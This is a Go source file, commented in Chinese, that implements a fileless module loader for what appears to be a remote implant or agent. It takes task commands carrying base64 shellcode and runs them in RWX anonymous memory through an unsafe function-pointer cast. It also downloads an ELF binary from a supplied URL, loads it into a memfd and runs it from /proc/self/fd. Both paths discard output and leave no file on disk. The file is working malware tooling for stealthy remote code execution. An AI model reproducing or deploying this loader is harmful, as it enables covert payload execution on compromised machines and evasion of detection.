// module.go — 模块加载器（无落地执行）
//
// 支持两种执行方式：
//   - shellcode：mmap RWX 匿名内存，直接跳转执行 PIC 机器码
//   - exec：HTTP/HTTPS 拉取 ELF，写入 memfd，通过 /proc/self/fd/<n> 执行
//
// 两种方式均不落地文件，异步执行，只报告释放状态，不捕获输出。
//
// 限制：仅支持 Linux
package main

import (
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"syscall"
	"time"
	"unsafe"
)

// memfdCreate 创建一个匿名内存文件（memfd_create syscall）。
// 返回文件描述符，可通过 /proc/self/fd/<fd> 路径执行。
func memfdCreate(name string) (int, error) {
	// syscall 编号因架构而异
	var sysNum uintptr
	switch runtime.GOARCH {
	case "amd64":
		sysNum = 319
	case "arm64":
		sysNum = 279
	case "386":
		sysNum = 356
	default:
		return -1, fmt.Errorf("memfd_create 不支持架构: %s", runtime.GOARCH)
	}

	namePtr, err := syscall.BytePtrFromString(name)
	if err != nil {
		return -1, err
	}

	fd, _, errno := syscall.RawSyscall(sysNum, uintptr(unsafe.Pointer(namePtr)), 0, 0)
	if errno != 0 {
		return -1, errno
	}
	return int(fd), nil
}

// launchELFInMem 将 ELF 字节写入 memfd 并通过 /proc/self/fd/<n> 启动子进程。
// 子进程异步运行，调用立即返回。
func launchELFInMem(elfBytes []byte, args []string) error {
	fd, err := memfdCreate("module")
	if err != nil {
		return fmt.Errorf("memfd_create 失败: %w", err)
	}

	f := os.NewFile(uintptr(fd), "memfd")
	if _, err := f.Write(elfBytes); err != nil {
		f.Close()
		return fmt.Errorf("写入 memfd 失败: %w", err)
	}
	// 不关闭 f，子进程通过 /proc/self/fd/<fd> 继承并执行

	path := fmt.Sprintf("/proc/self/fd/%d", fd)
	cmd := exec.Command(path, args...)
	// 不设置 Stdout/Stderr：输出直接丢弃
	cmd.Stdout = nil
	cmd.Stderr = nil

	if err := cmd.Start(); err != nil {
		f.Close()
		return fmt.Errorf("启动失败: %w", err)
	}

	logf("[module] ELF 已通过 memfd 启动，pid=%d\n", cmd.Process.Pid)

	// 异步回收子进程，避免僵尸进程
	go func() {
		cmd.Wait()
		f.Close()
		logf("[module] pid=%d 已退出\n", cmd.Process.Pid)
	}()

	return nil
}

// moduleResult 描述一次 shellcode 释放的结果。
type moduleResult struct {
	Status string `json:"status"` // "launched" | "error"
	Bytes  int    `json:"bytes"`
	Arch   string `json:"arch"`
	Error  string `json:"error,omitempty"`
}

// runShellcode 在匿名 RWX 内存中执行 shellcode。
// 异步执行，调用返回时 shellcode 已开始运行（或失败）。
func runShellcode(sc []byte) error {
	if len(sc) == 0 {
		return fmt.Errorf("shellcode 为空")
	}

	mem, err := syscall.Mmap(
		-1, 0, len(sc),
		syscall.PROT_READ|syscall.PROT_WRITE|syscall.PROT_EXEC,
		syscall.MAP_PRIVATE|syscall.MAP_ANON,
	)
	if err != nil {
		return fmt.Errorf("mmap 失败: %w", err)
	}

	copy(mem, sc)

	logf("[module] shellcode %d 字节已写入匿名内存，开始执行\n", len(sc))

	go func() {
		defer func() {
			if r := recover(); r != nil {
				logf("[module] shellcode panic: %v\n", r)
			}
			// shellcode 若正常返回（而非 exit syscall）才会执行到这里
			_ = syscall.Munmap(mem)
			logf("[module] shellcode 已返回，内存已释放\n")
		}()

		// Go func value 内部布局：func() 变量 → *{ codePtr uintptr }
		// 通过 unsafe 构造指向 shellcode 的假函数值并调用
		codePtr := uintptr(unsafe.Pointer(&mem[0]))
		fn := *(*func())(unsafe.Pointer(&codePtr))
		fn()
	}()

	return nil
}

// cmdModuleShellcode 处理 module.shellcode 任务。
// body 字段：
//
//	payload  string  base64 编码的 shellcode 字节
//	arch     string  目标架构（amd64 / arm64 / …），必须与节点一致
func cmdModuleShellcode(body map[string]interface{}) map[string]interface{} {
	arch, _ := body["arch"].(string)
	if arch == "" {
		arch = "amd64"
	}
	if arch != runtime.GOARCH {
		return map[string]interface{}{
			"status": "error",
			"error":  fmt.Sprintf("arch 不匹配: 节点为 %s，shellcode 为 %s", runtime.GOARCH, arch),
		}
	}

	payloadB64, _ := body["payload"].(string)
	if payloadB64 == "" {
		return map[string]interface{}{
			"status": "error",
			"error":  "body.payload 为空",
		}
	}

	sc, err := base64.StdEncoding.DecodeString(payloadB64)
	if err != nil {
		return map[string]interface{}{
			"status": "error",
			"error":  "base64 解码失败: " + err.Error(),
		}
	}

	if err := runShellcode(sc); err != nil {
		return map[string]interface{}{
			"status": "error",
			"error":  err.Error(),
		}
	}

	return map[string]interface{}{
		"status": "launched",
		"bytes":  len(sc),
		"arch":   arch,
	}
}

// cmdModuleExec 处理 module.exec 任务：从 URL 拉取 ELF 并通过 memfd 执行。
// body 字段：
//
//	url      string    ELF 下载地址（http/https）
//	args     []string  传递给 ELF 的命令行参数（可选）
//	timeout  number    下载超时秒数，默认 30
func cmdModuleExec(body map[string]interface{}) map[string]interface{} {
	url, _ := body["url"].(string)
	if url == "" {
		return map[string]interface{}{
			"status": "error",
			"error":  "body.url 为空",
		}
	}

	// 解析可选参数
	var args []string
	if rawArgs, ok := body["args"].([]interface{}); ok {
		for _, a := range rawArgs {
			if s, ok := a.(string); ok {
				args = append(args, s)
			}
		}
	}

	timeoutSec := 30
	if t, ok := body["timeout"].(float64); ok && t > 0 {
		timeoutSec = int(t)
	}

	logf("[module] 开始下载 ELF: %s\n", url)

	client := &http.Client{Timeout: time.Duration(timeoutSec) * time.Second}
	resp, err := client.Get(url)
	if err != nil {
		return map[string]interface{}{
			"status": "error",
			"error":  "下载失败: " + err.Error(),
		}
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return map[string]interface{}{
			"status": "error",
			"error":  fmt.Sprintf("HTTP %d: %s", resp.StatusCode, url),
		}
	}

	elfBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return map[string]interface{}{
			"status": "error",
			"error":  "读取响应失败: " + err.Error(),
		}
	}

	// 简单校验 ELF magic
	if len(elfBytes) < 4 || string(elfBytes[:4]) != "\x7fELF" {
		return map[string]interface{}{
			"status": "error",
			"error":  fmt.Sprintf("不是有效的 ELF 文件（收到 %d 字节）", len(elfBytes)),
		}
	}

	logf("[module] 下载完成，%d 字节，写入 memfd\n", len(elfBytes))

	if err := launchELFInMem(elfBytes, args); err != nil {
		return map[string]interface{}{
			"status": "error",
			"error":  err.Error(),
		}
	}

	return map[string]interface{}{
		"status": "launched",
		"bytes":  len(elfBytes),
		"url":    url,
	}
}
